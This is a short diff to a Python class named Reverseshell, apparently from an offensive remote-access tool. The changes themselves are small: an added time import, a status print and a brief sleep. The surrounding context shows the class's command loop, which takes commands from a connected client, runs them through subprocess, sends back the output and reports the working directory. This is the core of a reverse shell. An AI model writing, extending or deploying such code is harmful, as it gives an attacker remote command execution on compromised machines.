@@ -1,6 +1,7 @@
 from core.utils import display_msg
 import os
 import subprocess
+import time
 
 
 class Reverseshell:
@@ -23,9 +24,11 @@ class Reverseshell:
                 try:
                     cmd_result = self.execute_commands(command)
                     client.send_data(cmd_result)
+                    print("command executed perfectly")
                 except Exception as err:
                     client.send_data("Unable to execute command some random error occured!\n" + str(err))
             new_pwd = os.getcwd()
+            time.sleep(0.1)
             client.send_data(new_pwd)
     
     def change_dir(self, command):
@@ -45,6 +48,7 @@ class Reverseshell:
             cmd_result = (output.stdout.decode('utf-8'))
         else:
             cmd_result = (output.stderr.decode('utf-8'))
+        
         return cmd_result
 
 
